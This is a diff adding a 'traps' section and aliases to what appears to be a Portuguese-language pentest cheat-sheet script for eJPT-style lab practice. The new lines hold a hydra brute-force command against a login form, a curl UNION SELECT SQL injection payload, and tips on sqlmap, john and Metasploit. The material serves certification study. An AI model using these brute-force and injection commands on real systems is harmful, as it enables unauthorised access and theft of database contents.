@@ -105,6 +105,18 @@ CENARIOS = {
         "curl -s -i -d 'usuario=admin&senha=SENHA' http://IP/login.php | head",
         "# local: hydra sem ssh/rdp (compilado sem libssh) -> ssh_brute.py ou msf ssh_login",
     ]),
+    "traps": ("Armadilhas medidas em 21/out (ler antes de culpar o alvo)", [
+        "# 1) hydra http-get SEM F= -> falso positivo (deu admin:admin num form cuja senha era password)",
+        "hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \"/login.php:u=^USER^&p=^PASS^:F=Login failed\"",
+        "# 2) form com CSRF token -> hydra nao serve; usar:",
+        "python3 ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password --extra 'Login=Login'",
+        "# 3) msf -r: script so funciona em $HOME sem ponto no nome (/tmp e .arquivo falham) -> use -x",
+        "# 4) sqlmap 'not injectable' nao e veredito: testar UNION na mao antes de descartar",
+        "curl -s \"http://IP/page?id=1' UNION SELECT 1,user(),database(),3-- -\"",
+        "# 5) john com --format errado roda e nao acha nada (md5=raw-md5, windows=nt, shadow=sha512crypt)",
+        "# 6) ssh_brute.py so roda com ~/venvs/pentest/bin/python (paramiko)",
+        "# 7) recon rapido de 1 alvo: bash ~/LIBERTUS/ejpt/scan.sh IP",
+    ]),
 }
 
 ALIASES = {
@@ -114,6 +126,8 @@ ALIASES = {
     "pivoting": "pivot", "socks": "pivot", "proxychains": "pivot",
     "reverseshell": "shell", "reverse": "shell", "nc": "shell",
     "metasploit": "msf", "msfvenom": "msf",
+    "trap": "traps", "armadilha": "traps", "armadilhas": "traps", "falso": "traps",
+    "erro": "traps", "travei": "traps", "bug": "traps",
 }
 
 
